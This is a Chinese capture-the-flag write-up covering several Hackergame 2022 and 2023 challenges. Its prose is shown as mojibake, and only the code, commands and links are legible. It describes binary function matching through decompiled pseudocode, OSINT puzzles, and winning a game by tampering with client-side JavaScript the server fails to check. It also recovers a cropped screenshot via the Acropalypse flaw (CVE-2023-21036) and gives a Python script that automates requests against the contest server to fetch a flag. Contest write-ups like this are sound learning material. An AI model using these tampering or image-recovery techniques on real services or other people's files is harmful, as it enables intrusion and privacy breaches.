# å‰è¨€

ä»2020å¹´å¼€å§‹æ¯å¹´çš„hackergameéƒ½æ¥å‚åŠ ï¼Œè‡³ä»Šå·²ç»æ˜¯ç¬¬4å¹´äº†ã€‚é¢˜ç›®è´¨é‡é«˜ã€éš¾åº¦é€‚ä¸­ã€ä¸ªäººèµ›ï¼Œhackergameæ˜¯éš¾å¾—çš„åŒæ—¶æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶çš„æ¯”èµ›ä¹‹ä¸€ï¼Œæ¯å¹´å‚èµ›åçš„å¤ç›˜ä¹Ÿéƒ½ä¼šæ‰©å¤§çŸ¥è¯†é¢ï¼Œå€¼å¾—å‚åŠ ï¼Œæ˜å¹´æœ‰ç©ºä¸€å®šå†æ¥ã€‚    

åªä¸è¿‡ï¼Œä½œä¸ºä¸€ä¸ªç¤¾ç•œï¼Œ7å¤©æœŸé—´èƒ½åšé¢˜çš„æ—¶é—´å®åœ¨æœ‰é™ï¼ˆåŸºæœ¬é›†ä¸­åœ¨å¼€èµ›çš„å‘¨æœ«ï¼Œå†åŠ ä¸Šåé¢å‡ å¤©æ™šä¸Šçš„é›¶æ•£æ—¶é—´ï¼‰ï¼Œå¦‚æœèƒ½å»¶é•¿åˆ°9å¤©åŒ…å«ä¸¤ä¸ªå‘¨æœ«ä¼šå¥½å¾ˆå¤šï¼ˆå½“ç„¶ï¼Œåˆ†æ•°ä¹Ÿä¼šå·çš„æ›´é«˜å§ï¼‰  

# è¡¥hackergame2022é¢˜ç›®

æœ¬åº”åœ¨å»å¹´å†™çš„ï¼Œä½†ä¸€å’•å†å’•â€¦â€¦è¶æ­¤æœºä¼šè¡¥ä¸Šï¼ˆå…¶å®ä¹Ÿå°±ä¸€é“é¢˜ï¼‰  

## ç«çœ¼é‡‘ç›çš„å° E

[https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B%E7%9A%84%E5%B0%8F%20E/README.md](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B%E7%9A%84%E5%B0%8F%20E/README.md )

éœ€è¦åœ¨åŒä¸€ä»½æºç ç¼–è¯‘å‡ºçš„ä¸åŒäºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾å‡ºåŒ¹é…çš„å‡½æ•°ã€‚æ­¤é¢˜level3ï¼ˆè¦æ±‚200ç»„O0ä¸O3çš„åŒ¹é…ä¸ä½äº30%æ­£ç¡®ç‡ï¼‰åªæœ‰ä¸¤è§£ï¼ˆå¦‚æœæ²¡è®°é”™çš„è¯ï¼‰ï¼Œæˆ‘æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼ˆå¦ä¸€ä½æ˜¯mcfxï¼Œæ— æ‚¬å¿µï¼‰ã€‚  

å‡ºé¢˜äººçš„[é¢„æœŸè§£](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B%E7%9A%84%E5%B0%8F%20E/README.md )å¯¹å‰ä¸¤å…³çš„é¢„è®¾æ˜¯[BinDiff](https://www.zynamics.com/bindiff.html )ï¼ˆæˆ–è€…ç±»ä¼¼çš„[Diaphora](https://github.com/joxeankoret/diaphora )ï¼‰ï¼Œè€Œç¬¬ä¸‰å…³æ˜¯[SAFE](https://arxiv.org/pdf/1811.05296.pdf )æˆ–[jTrans](https://arxiv.org/pdf/2205.12713.pdf )ç­‰åŸºäºæœºå™¨å­¦ä¹ çš„æ–¹æ¡ˆã€‚è€Œ[mcfxçš„è§£æ³•](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/players/nbnbnb/README.md )æåˆ°ï¼ŒDiaphoraå’ŒBindiffæ­£ç¡®ç‡åœ¨åªæœ‰15%-22%ï¼Œè€Œæ‰‹åšæ­£ç¡®ç‡èƒ½é«˜è¾¾70%ï¼  

äºŒè¿›åˆ¶åŒ¹é…é—®é¢˜å®é™…æœ‰ä¸¤ç±»æˆªç„¶ä¸åŒçš„åº”ç”¨åœºæ™¯ã€‚ä¸€ç±»ç”¨äºæ¯”è¾ƒç»†å¾®å·®å¼‚ï¼Œå¸¸ç”¨äºbugfixåˆ†æç­‰åœºæ™¯ï¼›å¦ä¸€ç±»ç”¨äºè¯­ä¹‰åŒ¹é…ï¼Œå¸¸ç”¨äºåº“å‡½æ•°è¯†åˆ«ç­‰åœºæ™¯ã€‚å‰è€…éœ€è¦å¯¹ä»£ç å·®å¼‚éå¸¸æ•æ„Ÿï¼Œåè€…éœ€è¦ä»é«˜åº¦å˜å¼‚çš„ä¸¤æ®µä»£ç ä¸­æ‰¾å‡ºå…±æ€§ï¼Œè¿™æ˜¯å¤©ç„¶çŸ›ç›¾çš„ä¸¤ä¸ªç›®æ ‡ã€‚  
é¢˜ç›®è¦æ±‚è§£å†³çš„æ˜¾ç„¶æ˜¯ç¬¬äºŒç±»åœºæ™¯ï¼Œè€Œå¾ˆé—æ†¾BinDiffå’ŒDiaphoraä¸»è¦é’ˆå¯¹ç¬¬ä¸€ç±»åœºæ™¯ï¼Œè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆå®ƒä»¬åœ¨level3çš„è¡¨ç°æå…¶ç³Ÿç³•ã€‚  


ä½†æ˜¯ä¸ºä»€ä¹ˆæ‰‹åšæ­£ç¡®ç‡èƒ½é‚£ä¹ˆé«˜å‘¢ï¼Ÿ  
æƒ³ä¸€æƒ³äººæ˜¯æ€ä¹ˆæ‰‹åšlevel1çš„ï¼šå¼€ä¸¤ä¸ªIDAï¼Œå·¦å³åˆ†å±ï¼Œå›ºå®šå·¦è¾¹çš„å‡½æ•°ï¼Œæ»šåŠ¨å³è¾¹çš„å‡½æ•°ï¼Œå¦‚æœä¸¤è¾¹çœ‹èµ·æ¥å¾ˆåƒï¼Œå°±é€‰å®šå®ƒäº†ï¼è‡³å°‘ï¼Œæ­£å¸¸äººåº”è¯¥ä¸ä¼šç›¯ç€æ±‡ç¼–çœ‹ã€‚  

O0ä¸O3çš„äºŒè¿›åˆ¶å‡½æ•°å·®å¼‚å†å¤§ï¼Œç»ˆç©¶æ˜¯ä»åŒä¸€ä»½æºä»£ç ç¼–è¯‘è€Œæ¥çš„ã€‚  
ä»æŠ½è±¡çš„è§’åº¦çœ‹ï¼Œç¼–è¯‘å™¨åªæ˜¯åšäº†ä¸€ä»½ä»å­—èŠ‚æµåˆ°å­—èŠ‚æµçš„å˜æ¢ï¼Œä½†æ˜¯è¦ç¡®ä¿å‡½æ•°çš„è¯­ä¹‰åœ¨å˜æ¢å‰åä¸¥æ ¼ä¸€è‡´ã€‚è€Œå‡½æ•°è¯­ä¹‰ä¸€è‡´çš„è¡¨ç°ï¼Œä¸ä¸¥è°¨çš„ç®€åŒ–ä¸€ä¸‹ï¼Œå°±æ˜¯å¯¹äºä»»ä½•ç›¸åŒçš„è¾“å…¥ï¼Œå¿…é¡»ç»™å‡ºç›¸åŒçš„è¾“å‡ºã€‚\[[_](https://github.com/hzqmwne/my-ctf-challenges/blob/master/0CTF_TCTF-2021-Finals/babalogin/writeup/writeup_en.md )\]  

å‡½æ•°è¯­ä¹‰æ˜¯æŠ½è±¡çš„ï¼Œéœ€è¦æŠŠå®ƒå…·åŒ–ä¸‹æ¥æ‰èƒ½å®é™…è¿›è¡Œæ¯”è¾ƒã€‚æ ¹æ®æŠ½è±¡å±‚æ¬¡ä»ä½åˆ°é«˜ï¼Œå‡½æ•°è¯­ä¹‰å¯ä»¥å…·åŒ–ä¸ºï¼šæ±‡ç¼–è¯­å¥ã€åŸºæœ¬å—ã€æ§åˆ¶æµã€æ•°æ®æµã€æºä»£ç ã€ç®—æ³•ã€‚  

æ§åˆ¶æµåˆ°æ•°æ®æµæ˜¯å…¶ä¸­çš„åˆ†æ°´å²­ï¼Œå¾ˆå¤šç¼–è¯‘ä¼˜åŒ–éƒ½æ˜¯åŸºäºæ•°æ®æµå›¾è¿›è¡Œçš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡½æ•°è¯­ä¹‰ç›¸åŒçš„å‡½æ•°çš„ä½å±‚æ¬¡æŠ½è±¡ï¼ˆæ±‡ç¼–è¯­å¥ã€åŸºæœ¬å—ã€æ§åˆ¶æµï¼‰å¯ä»¥åƒå˜ä¸‡åŒ–ï¼Œä½†é«˜å±‚æ¬¡æŠ½è±¡ï¼ˆæ•°æ®æµã€æºä»£ç ã€ç®—æ³•ï¼‰å¾€å¾€ååˆ†æ¥è¿‘ã€‚SAFEå’ŒjTransåœ¨æœ¬é¢˜éš¾ä»¥è¾¾åˆ°æœ€ä½³æ•ˆæœï¼Œå¾ˆå¯èƒ½æ˜¯å› ä¸ºå®ƒä»¬ä»ç„¶åŸºäºæ±‡ç¼–å’Œæ§åˆ¶æµç­‰ä½å±‚æ¬¡æŠ½è±¡æ„é€ è®­ç»ƒé›†çš„åŸå› ã€‚  

åç¼–è¯‘å™¨å°±æ˜¯æŠŠä½å±‚æ¬¡æŠ½è±¡è¯­ä¹‰è½¬æ¢ä¸ºé«˜å±‚æ¬¡æŠ½è±¡è¯­ä¹‰çš„æœ€ä½³å·¥å…·ã€‚ï¼ˆIDA F5 yydsï¼ï¼‰  

æ‰€ä»¥ï¼Œä¸€ä¸ªå¾ˆæœ´ç´ çš„æ€è·¯äº§ç”Ÿäº†ï¼šåˆ©ç”¨IDAçš„F5æŠŠæ‰€æœ‰çš„å‡½æ•°éƒ½åç¼–è¯‘ä¸ºä¼ªä»£ç ï¼Œç„¶åå¯¹ä¼ªä»£ç æ‰§è¡Œå­—ç¬¦ä¸²ç›¸ä¼¼åº¦åŒ¹é…ï¼Œå¯¹ç»™å®šçš„å‡½æ•°ï¼Œåœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°ä¼ªä»£ç å­—ç¬¦ä¸²æœ€ç›¸ä¼¼çš„å‡½æ•°ä½œä¸ºç­”æ¡ˆæäº¤ã€‚  

è¿™ç§æ–¹æ³•ååˆ†ç®€å•ï¼Œè€Œä¸”å¯ä»¥å®Œå…¨è‡ªåŠ¨åŒ–ï¼Œå¹¶æœ€ç»ˆä»¥æ¥è¿‘70%çš„æ­£ç¡®ç‡è½»æ¾æ”»å…‹level3ã€‚  

---

ä»£ç å®ç°ä¸éš¾ä½†æœ‰äº›æ‚ä¹±ï¼Œè¿™é‡Œä¸è´´äº†ï¼Œä¸è¿‡ä¸€äº›ç»†èŠ‚è¦æ³¨æ„ï¼š  

1. ç”¨IDA python scriptæ‰¹é‡åç¼–è¯‘ä¸€ä¸ªç¨‹åºä¸­æ‰€æœ‰çš„å‡½æ•°ï¼Œå¿…é¡»ç­‰å¾… `ida_auto.auto_wait()` å®Œæˆæ‰èƒ½å¼€å§‹ï¼Œå¦åˆ™åç¼–è¯‘å‡ºæ¥çš„ä¼ªä»£ç æ•ˆæœå·¨å·®æ ¹æœ¬æ— æ³•ä¸GUIçª—å£çš„ç›¸æ¯”  
2. å¾ˆå¤šå‡½æ•°æ— æ³•è¢«IDAè¯†åˆ«å‡ºæ¥ï¼Œåˆ†æåå‘ç°ä¸»è¦æ˜¯ç”±äº`.dynstr`ä¸`.symtab`æ®µè¢«å»é™¤ï¼Œå¯¼è‡´å‡½æ•°ç»“å°¾çš„`__stack_check_fail`å’Œ`_exit`ç­‰å‡½æ•°çš„`noreturn`å±æ€§æ— æ³•è¢«è¯†åˆ«å‡ºæ¥ï¼Œè€Œè¿™ä¸¤ä¸ªå‡½æ•°åœ¨pltè¡¨ï¼Œæ²¡æœ‰returnï¼Œä¼šå¯¼è‡´ç›¸é‚»çš„å‡½æ•°è¢«é”™è¯¯çš„åˆå¹¶ä¸ºä¸€äº›å¤§å‡½æ•°  
3. å› æ­¤åœ¨åç¼–è¯‘å‰éœ€è¦å…ˆåˆ‡åˆ†å¥½æ‰€æœ‰çš„å‡½æ•°ã€‚æ³¨æ„åˆ°æ±‡ç¼–çª—å£æ¯ä¸ªçœŸå®çš„å‡½æ•°(æ— è®ºIDAæ˜¯å¦è¯†åˆ«å‡ºæ¥)çš„å¼€å¤´éƒ½æœ‰ "`__unwind {`" å­—æ ·çš„æ³¨é‡Šï¼Œå¯ä»¥åˆ©ç”¨å®ƒä½œä¸ºä¸€ä¸ªç‰¹å¾è¯†åˆ«å‡½æ•°è¾¹ç•Œã€‚ç„¶åç”¨del_funcåˆ é™¤æ‰€æœ‰IDAè‡ªåŠ¨è¯†åˆ«çš„å‡½æ•°å¹¶ç”¨add_funcé‡æ–°æ·»åŠ è‡ªå·±åˆ‡åˆ†çš„å‡½æ•°ï¼Œé‡æ–°auto_waitå†åç¼–è¯‘ã€‚  
4. å­—ç¬¦ä¸²ç›¸ä¼¼åº¦æ¯”è¾ƒé‡‡ç”¨çš„æ˜¯Levenshteinè·ç¦»ï¼Œè¿™æ˜¯æœ€ç²¾ç¡®çš„å­—ç¬¦ä¸²ç›¸ä¼¼åº¦æ¯”è¾ƒï¼Œä½†è·‘èµ·æ¥å¹¶æ²¡æœ‰ç‰¹åˆ«æ…¢  

---

å‡ºé¢˜äººè¯´"binaryai éœ€è¦æ³¨å†Œï¼Œå¹¶ä¸”å·²ç»åœæ­¢æœåŠ¡äº†"ï¼Œä½†äº‹å®ä¸Š [BinaryAI](https://www.binaryai.cn/ ) å·²ç»é‡æ–°å¼€æœä¸”å…¨æ–°å‡çº§äº†ã€‚  

å‡å¦‚é¢˜ç›®å‡ºåœ¨ä»Šå¹´ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯• BinaryAIçš„ [åŒæ–‡ä»¶è‡ªå®šä¹‰æ¯”å¯¹](https://www.binaryai.cn/comparison )ï¼Œç½‘ç«™ä¸Šçš„æ ·ä¾‹æ–‡ä»¶ `openssl-1.1.1u-gcc_arm_O0-openssl.strip` vs 
`openssl-3.1.1-gcc_x64_O3-openssl.strip` åŒ¹é…æ•ˆæœååˆ†å‡ºè‰²ï¼ˆè¿™ä¸¤ä¸ªæ–‡ä»¶çš„åº“ç‰ˆæœ¬ã€æ¶æ„ã€ä¼˜åŒ–é€‰é¡¹éƒ½ä¸åŒï¼Œæ¯”æœ¬é¢˜é¢„è®¾çš„åœºæ™¯éš¾åº¦æ›´é«˜ã€‚[é“¾æ¥1](https://www.binaryai.cn/compare/eyJzaGEyNTYiOiJiNDQzYjRjMmNiMzlkYWNmMTkwNzA3NTI1NGE3MWJkYTg1ZjU2OTczNDk3YjgxNmUyZWRjNTNlZGQ2OTE4MTllIiwidGFyZ2V0Ijp7ImJpbmRpZmYiOnsic2hhMjU2IjoiZTMwZWRjOGQ2YjYyN2U5YmRjMTRmNWQyMTViNzZiYTUxYzFjMTNhODZjOWNjYzEzYzY1YmEyNGIzZTdmODRiMCJ9fX0= )ã€ [é“¾æ¥2](https://www.binaryai.cn/interactive/compare/eyJzaGEyNTYiOiJiNDQzYjRjMmNiMzlkYWNmMTkwNzA3NTI1NGE3MWJkYTg1ZjU2OTczNDk3YjgxNmUyZWRjNTNlZGQ2OTE4MTllIiwidGFyZ2V0Ijp7ImJpbmRpZmYiOnsic2hhMjU2IjoiZTMwZWRjOGQ2YjYyN2U5YmRjMTRmNWQyMTViNzZiYTUxYzFjMTNhODZjOWNjYzEzYzY1YmEyNGIzZTdmODRiMCJ9fX0=?function=153564 )ï¼‰ã€‚  

å®æµ‹äº†å‡ ç»„å½“æ—¶ä¿å­˜çš„level2ç¨‹åºï¼ŒBinaryAIå¹³å°ç»™å‡ºçš„ç»“æœå‡ ä¹100%æ­£ç¡®ï¼Œè€Œä¸”é€Ÿåº¦å¾ˆå¿«æ¯ç»„åªè¦1åˆ†é’Ÿå·¦å³ã€‚  
å¯¹äºlevel3ï¼Œå¹³å°ä¹Ÿä¼šé‡åˆ°å‡½æ•°åˆ‡åˆ†çš„é—®é¢˜å¯¼è‡´æ•ˆæœä¸ä½³ï¼Œä¸è¿‡è¿™ä¸ªå¯ä»¥æœ¬åœ°å…ˆå¤„ç†ä¸‹å†ä¸Šä¼ ï¼ˆæœ‰ç‚¹å¤æ‚ï¼Œè€Œä¸”æ—¶éš”ä¸€å¹´ï¼Œå°±ä¸å†è¯•éªŒæ•ˆæœäº†ï¼‰ã€‚  

# hackergame2023é¢˜ç›®

## Hackergame å¯åŠ¨

ç‚¹æäº¤ï¼Œurlç»“å°¾å‡ºç°"?similarity="ï¼Œç­‰å·åé¢å¡«100   

## çŒ«å’ªå°æµ‹

ï¼ˆä»Šå¹´çš„çŒ«å’ªå°æµ‹éš¾åº¦å¤§é™ï¼‰  

1. ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å›¾ä¹¦é¦†ç½‘ç«™ https://lib.ustc.edu.cn/ æœç´¢ "A Classical Introduction To Modern Number Theory"ï¼ˆå»æ‰åé¢çš„ 2nd ed\.ï¼‰ï¼Œåœ¨[è¥¿åŒºå¤–æ–‡ä¹¦åº“](http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=36356f4861302f4734367732314e64394f6a797a654f46444d53506633476761725267413365764f752b513d )  
å›åˆ°é¦–é¡µæ‰¾[é¦†è—åˆ†å¸ƒ](https://lib.ustc.edu.cn/%e6%9c%ac%e9%a6%86%e6%a6%82%e5%86%b5/%e9%a6%86%e8%97%8f%e5%88%86%e5%b8%83/ )ï¼Œè¥¿åŒº12æ¥¼æ˜¯å¤–æ–‡ä¹¦åº“
2. ç™¾åº¦æœç´¢"å¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™"ï¼ˆè¿™æ¬¡æ¯”æŸä¸å­˜åœ¨çš„æœç´¢å¼•æ“æ•ˆæœå¥½ï¼‰ï¼Œæ‰¾åˆ°ä¸€ç¯‡çŸ¥ä¹é—®é¢˜[ä½ è§è¿‡å“ªäº›æå“è®ºæ–‡](https://www.zhihu.com/question/20337132/answer/3023506910?utm_source=zhihu )ï¼Œç¬¬ä¸€ä¸ªå›ç­”ç»™å‡ºç­”æ¡ˆæ˜¯23ï¼ŒåŸå§‹è®ºæ–‡åœ¨[arxiv](https://arxiv.org/abs/2303.17626 )  
3. æœç´¢linux kernel tcp bbr configç­‰ç›¸å…³å†…å®¹ï¼Œç­”æ¡ˆæ˜¯ CONFIG_TCP_CONG_BBR  
4. æœç´¢"mypy dead loop"ï¼Œå¾ˆé å‰çš„ç»“æœå°±æ˜¯[Python Type Hints Are Turing Complete](https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf)ï¼Œä¼šè®®ä¸ºECOOPã€‚  
   å…³äºmypyï¼Œä¸ªäººè®¤ä¸ºè¿™æ‰æ˜¯çœŸæ­£èƒ½æå‡pythonä»£ç è´¨é‡çš„å·¥å…·ï¼ˆflake8ã€pylintã€blackã€isortä¹‹ç±»çš„å·¥å…·å¹¶ä¸èƒ½æ²»æœ¬ï¼‰ï¼Œè‡ªå·±ç›®å‰å†™çš„æ‰€æœ‰pythoné¡¹ç›®éƒ½ä¸€ç›´å¼€å¯\-\-stricté€‰é¡¹ï¼ˆæŠŠpythonå½“é™æ€è¯­è¨€å†™\(å¿«è¿›åˆ°tython\)ï¼‰ï¼ˆä¹Ÿä¸€ç›´æƒ³åœ¨å…¬å…±ä»“åº“CIæµæ°´çº¿æ¨å¹¿å¼€å¯`mypy --strict`\(è¿™æ ·è‡³å°‘è§ä¸åˆ°ä¸€ä¸ªlistå­˜å‡ ç§ä¸åŒç±»å‹æ•°æ®ã€å¤šå±‚åµŒå¥—åˆ—è¡¨\[0\]\[1\]\[0\]\)ä¹‹ç±»å¯è¯»æ€§åœ°ç‹±çš„ä»£ç äº†\)\(ä¸è¿‡ï¼Œæ¨å¹¿å¹¶ä¸æˆåŠŸâ€¦\)ï¼‰ï¼ˆä½ è¯´æœ¬ç¯‡writeupçš„pythonä»£ç éƒ½æ²¡åšç±»å‹æ ‡æ³¨ï¼Ÿä¸€æ¬¡æ€§çš„è„šæœ¬å½“ç„¶æ²¡å¿…è¦å‘é•¿æœŸç»´æŠ¤çš„é¡¹ç›®é‚£ä¹ˆä¸¥è°¨ï¼‰  
   ä¸è¿‡ä»æœ¬é¢˜ç¬¬ä¸€æ¬¡çŸ¥é“pythonçš„type hintæ˜¯å›¾çµå®Œå¤‡çš„ï¼Œæˆ–è®¸å¯ä»¥æƒ³æƒ³å¦‚ä½•å‡ºæˆä¸€é“é€†å‘é¢˜ï¼ˆxï¼‰  

## æ›´æ·±æ›´æš—

flagæ˜¯jsåŠ¨æ€ç”Ÿæˆçš„ï¼Œç›´æ¥æŸ¥çœ‹æºä»£ç ä¸è¡Œï¼Œä½†F12çœ‹DOMå¯ä»¥  

## æ—…è¡Œç…§ç‰‡ 3.0

ä¸çŒ«å’ªå°æµ‹ç›¸åï¼Œä»Šå¹´çš„æ—…è¡Œç…§ç‰‡ç©¶ææŠ˜ç£¨  

1. ç…§ç‰‡çš„å¸¦å­ä¸Šæœ‰statphys28ï¼ŒæŸ¥åˆ°æ­¤ä¼šè®®æ—¥ç¨‹åœ¨2023-08-07åˆ°2023-08-11ä¹‹é—´ï¼Œçˆ†ç ´ä¸€ä¸‹å¾—åˆ°2023-08-10ã€‚  
2. å¥–ç‰Œæ˜¯è¯ºè´å°”å¥–ï¼Œå¥–å“ä¸Šçš„å§“åMasatoshi Koshibaæ˜¯ç‰©ç†å­¦å¥–ã€‚ä½†ï¼Œé¢˜ç›®è¯´çš„â€œåŒç§å¥–ç‰Œâ€ï¼Œç©¶ç«Ÿç‰¹æŒ‡è¯ºè´å°”ç‰©ç†å­¦å¥–ï¼Œè¿˜æ˜¯è¯ºè´å°”ç‰©ç†å­¦å’ŒåŒ–å­¦å¥–ï¼ˆè¿™ä¸¤ç§å¥–ç‰Œæ ·å¼ç›¸åŒï¼‰ï¼Œè¿˜æ˜¯æ‰€æœ‰è¯ºè´å°”å¥–ï¼Œç€å®çº ç»“è®¸ä¹…ã€‚èµ·åˆç€é‡äºæ‰¾è·å¾—è¯ºè´å°”å¥–çš„æ—¥æœ¬äººï¼Œè®¸ä¹…æ— æœï¼Œè½¬æ¢æ€è·¯æ‰¾ä¸œäº¬å¤§å­¦çš„wikiï¼Œåœ¨æ°å‡ºæ ¡å‹æ ä¸­æ‰¾åˆ°ä¸€ä¸ªè·å¥–è€…Takaaki Kajitaï¼Œè·å¥–æ—¶çš„ç ”ç©¶æ‰€æ˜¯ICRRã€‚  
3. ä¸å¤ªè®°å¾—æ€ä¹ˆæœåˆ°çš„æ—¥æœ¬æ¢…é…’èŠ‚ï¼ˆå…³é”®è¯å¤§æ¦‚å›´ç»•ä¸Šé‡å…¬å›­ã€å¤§å–·æ³‰ã€2023å¹´8æœˆç­‰ï¼‰ï¼Œåœ¨æ´»åŠ¨ç½‘ç«™ https://umeshu-matsuri.jp/tokyo_staff/ æœ‰é—®å·ç¼–å· S495584522ã€‚
4. ä»åœ°å›¾ä¸Šçœ‹ä½ç½®ï¼Œå¤§æ¦‚æ˜¯å›½ç«‹ç§‘å­¦åšç‰©é¦†ï¼Œç½‘ç«™https://www.kahaku.go.jp/english/userguide/access/index.html æåˆ°äº†Â¥630ã€Freeç­‰å‡ ä¸ªå€¼ï¼›ç¡®å®šç¬¬3é¢˜æ­£ç¡®çš„æƒ…å†µä¸‹ç›´æ¥ä»0çˆ†ç ´ï¼Œç»“æœä¸€ä¸‹å°±å¯¹äº†ï¼Ÿï¼Ÿ  
5. å·²çŸ¥æ—¥æœŸæ˜¯2023-08-10ï¼Œæ‰¾statphys28çš„timetableï¼šhttps://statphys28.org/programtt.htmlï¼Œå½“æ™šæ˜¯banquetï¼ˆå®´ä¼šï¼‰ï¼›ç»§ç»­æœç´¢statphys28 Banqietï¼Œæ‰¾åˆ°å®‰æ’ï¼šhttps://statphys28.org/banquet.html ï¼Œé›†åˆåœ°ç‚¹æ˜¯å®‰ç”°è®²å ‚ã€‚  
6. é¢˜ç›®æè¿°è¿·æƒ‘æ€§å¾ˆå¼ºâ€¦â€¦ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹æ˜¯button&cufflinksï¼Œè€Œä»¥button&cufflinksä¸ºå…³é”®å­—æœåˆ°çš„é‡ç‚¹æ˜¯8æœˆä¸å²åŠªæ¯”çš„è”åŠ¨æ´»åŠ¨â€¦â€¦å®Œå…¨è·‘åäº†ã€‚é‡ç‚¹åœ¨äºå¸¦ä¸ŠåŒå¼•å·"ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹"ï¼Œåœ¨ https://www.instagram.com/explore/tags/%E3%83%9C%E3%82%BF%E3%83%B3%E3%82%A2%E3%83%B3%E3%83%89%E3%82%AB%E3%83%95%E3%83%AA%E3%83%B3%E3%82%AF%E3%82%B9/?ref=9472 çœ‹åˆ°äº†ç²‰è‰²æµ·æŠ¥ï¼Œå›¾æ¡ˆæ˜¯ç†ŠçŒ«ã€‚ååŠé¢˜ï¼Œå…ˆè¯´äº†ä¸Šé‡ç«™ä¸­å¤®æ£€ç¥¨å£ï¼Œç´§æ¥ç€è¯´å‡ºç«™å¤„ï¼Œè¿™ç¬¬ä¸€ååº”è‚¯å®šæ˜¯ä¸Šé‡ç«™çš„å‡ºç«™å¤„å§â€¦â€¦ç„¶åå°±è·³å…¥äº†æ— å°½çš„å‘ï¼›ç›´åˆ°å¾ˆä¹…ä¹‹åï¼Œæœç´¢â€œä¸Šé‡  å¹¿å‘Šç‰Œ æ¯å°æ—¶ 3dåŠ¨ç‰©â€ï¼Œåœ¨ä¸€æ®µè§†é¢‘ https://www.youtube.com/watch?v=-Onv_zT3TFk ä¸­æ‰å‘ç°åœ°ç‚¹åœ¨æ¾€è°·ï¼ŒåŠ¨ç‰©æ˜¯ç§‹ç”°çŠ¬ã€‚  

ï¼ˆæ€»ä¹‹ï¼Œæ˜¯ä¸€é“ä»˜å‡ºå’Œæ”¶ç›Šå®Œå…¨å®Œå…¨ä¸æˆæ¯”ä¾‹çš„é¢˜ï¼‰  

## èµ›åšäº•å­—æ£‹

F12 networkè§‚å¯Ÿè¯·æ±‚ï¼ŒçŒœæµ‹åç«¯æ²¡æœ‰æ£€æŸ¥ç‚¹çš„æ ¼å­æ˜¯å¦ä¸ºç©ºï¼›æŠŠjsé‡Œæ ‡è®°æ ¼å­æ˜¯å¦ç‚¹è¿‡çš„å˜é‡è®¾ä¸º0ï¼ˆå…·ä½“å“ªä¸ªå¿˜äº†ï¼‰ï¼Œç„¶åç‚¹å‡»å¯¹æ‰‹çš„æ ¼å­ï¼Œå³å¯è½»æ¾è·èƒœã€‚  

## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

Googleäº²å„¿å­æ‰‹æœºæ˜¯pixelï¼Œæœç´¢â€œpixel screenshot cveâ€ï¼Œå‘ç°æ˜¯CVE-2023-21036çš„ACropalypseã€‚å…ˆæ‰¾äº†ç¬¬ä¸€ä¸ªå·¥å…· https://github.com/frankthetank-music/Acropalypse-Multi-Tool ï¼Œå§‹ç»ˆè§£å†³ä¸äº†å®ƒçš„å›¾å½¢ç•Œé¢åº“ä¾èµ–ï¼›æ¢æˆ https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02 ï¼Œç›´æ¥èƒ½è·‘å‡ºååŠå¼ å›¾ç‰‡ï¼Œflagæ¸…æ™°å¯è§ã€‚  

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

å¿½ç•¥å‰ç«¯çš„èŠ±é‡Œèƒ¡å“¨ï¼ŒF12çœ‹è¯·æ±‚ï¼Œæ‰€æœ‰æ¶ˆæ¯æ˜¯ä¸€æ¬¡æ€§è·å¾—çš„ï¼Œé‡Œé¢åŒ…å«äº†æ—¶é—´ã€‚æœ¬åœ°å¾ªç¯æŒ‰æ—¶å‘é€deleteMessageè¯·æ±‚å³å¯ã€‚  

```python
import json
import re
import time
import requests

headers = {"Cookie": "session=<>"}

r = requests.get("http://202.38.93.111:10021/api/checkToken", headers=headers)
#print(r.text)

r = requests.post("http://202.38.93.111:10021/api/getMessages", headers=headers)
start_time = time.time()
#print(r.text)
messages = json.loads(r.text)["messages"]


for i, message in enumerate(messages):
    print(i, message)
    delay = message["delay"]
    text = message["text"]
    current_time = time.time()
    while current_time - start_time < delay:
        time.sleep(0.5)
        current_time = time.time()
    if re.search(r"hack\[[a-z]+\]", text):
        r = requests.post("http://202.38.93.111:10021/api/deleteMessage", json={"id": i}, headers=headers)
        print(r.text)

r = requests.post("http://202.38.93.111:10021/api/getflag", headers=headers)
print(r.text)
```

## è™«

ä¸€çœ¼SSTVï¼Œå¾€å±Šhackergameè€ƒçƒ‚äº†çš„ä¸œè¥¿  

æ‰¾ä¸ªå·¥å…·ï¼šhttps://github.com/colaclanth/sstv  
`python -m sstv -d insect.wav -o result.png`

å¾—åˆ°æ•ˆæœå®Œç¾çš„åŸå§‹å›¾ç‰‡  

## JSON âŠ‚ YAML?

æœ‰ç‚¹æ³¢æŠ˜  
YAML 1.1ç”¨äº† https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files çš„ 12345e999  
